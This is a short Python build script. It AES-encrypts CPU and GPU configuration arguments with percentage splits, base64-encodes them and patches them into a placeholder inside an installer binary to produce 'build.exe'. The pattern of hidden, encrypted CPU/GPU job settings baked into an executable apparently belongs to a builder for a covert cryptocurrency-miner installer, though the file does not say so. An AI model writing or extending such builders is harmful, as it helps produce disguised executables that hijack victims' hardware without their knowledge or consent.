import base64

from encrypt_config import encrypter_aes


def build_main(configs: list[tuple[str, list[str]]]) -> None:
    cpu_string = ""
    gpu_string = ""
    configs = configs[:4]
    print(configs)
    for config in configs:
        cpu_bool = config[0].startswith("CPU")
        if cpu_bool:
            if not cpu_string:
                string_args = " ".join(config[1][1:])
                cpu_string = cpu_string + encrypter_aes(string_args)

            else:
                string_args = " ".join(config[1][1:])
                cpu_string = cpu_string + "," + encrypter_aes(string_args)
                percentage = "50"
                for arg in config[1][1:]:
                    if "percentage=" in arg:
                        percentage = int(arg.replace("%", "").split("=")[1].strip())
                        if percentage < 1:
                            percentage = 1

                        percentage = str(percentage)

                        if len(percentage) == 1:
                            percentage = "0" + percentage
                        elif len(percentage) > 2:
                            percentage = percentage[:2]

                cpu_string = str(100 - int(percentage)) + "$" + cpu_string

            continue

        if not gpu_string:
            string_args = " ".join(config[1][1:])
            gpu_string = gpu_string + encrypter_aes(string_args)

        else:
            string_args = " ".join(config[1][1:])
            gpu_string = gpu_string + "," + encrypter_aes(string_args)
            percentage = "50"
            for arg in config[1][1:]:
                if "percentage=" in arg:
                    percentage = int(arg.replace("%", "").split("=")[1].strip())
                    if percentage < 1:
                        percentage = 1

                    percentage = str(percentage)

                    if len(percentage) == 1:
                        percentage = "0" + percentage
                    elif len(percentage) > 2:
                        percentage = percentage[:2]

            gpu_string = str(100 - int(percentage)) + "$" + gpu_string

    encoded_args = cpu_string + "|" + gpu_string
    encoded_args = base64.b64encode(encoded_args.encode("utf-8")).decode()
    print(len(encoded_args))
    encoded_args = encoded_args + ("." * (7000 - len(encoded_args)))
    from installer_env import installer_bytes
    dots = ("." * 7000).encode("utf-16le")
    position = installer_bytes.find(dots)
    print(position)
    print(encoded_args.strip("."))
    data = (
            installer_bytes[:position]
            + encoded_args.encode("utf-16le")
            + installer_bytes[position + len(dots):]
    )
    open("build.exe", "wb").write(data)








